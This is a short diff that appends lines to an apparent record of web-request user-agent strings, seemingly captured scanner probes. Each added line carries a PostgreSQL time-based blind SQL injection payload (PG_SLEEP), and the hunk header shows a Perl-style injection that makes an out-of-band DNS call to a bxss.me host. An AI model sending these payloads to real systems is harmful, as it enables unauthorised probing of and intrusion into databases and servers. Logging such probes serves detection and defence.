@@ -4138,3 +4138,6 @@ geth(ostbyname(lc('hitnq'.'ytziujjb51084.bxss.me.')).'A'.chr(67).chr(hex('58')).
 Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36mM5K7e4o') OR 477=(SELECT 477 FROM PG_SLEEP(15))--)
 Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36fIslPuyV')) OR 115=(SELECT 115 FROM PG_SLEEP(15))--)
 Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36nTN7Ur2f' OR 616=(SELECT 616 FROM PG_SLEEP(15))--)
+Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36EEMF4AOM') OR 381=(SELECT 381 FROM PG_SLEEP(15))--)
+Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.368d0J7D7K' OR 824=(SELECT 824 FROM PG_SLEEP(15))--)
+Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36o2len1rd')) OR 647=(SELECT 647 FROM PG_SLEEP(15))--)
